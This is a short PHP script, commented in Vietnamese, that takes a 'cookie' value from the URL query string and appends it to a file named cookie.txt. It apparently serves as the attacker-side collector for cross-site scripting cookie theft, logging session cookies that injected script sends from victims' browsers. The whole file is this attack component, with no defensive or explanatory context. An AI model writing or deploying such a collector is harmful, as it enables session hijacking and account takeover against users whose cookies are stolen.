<?php
    if(isset($_GET['cookie'])){
        $myfile = fopen("cookie.txt", "a"); # Ghi vào file cookie.txt
        fwrite($myfile, "\n". $_GET['cookie']);
        fclose($myfile);
    }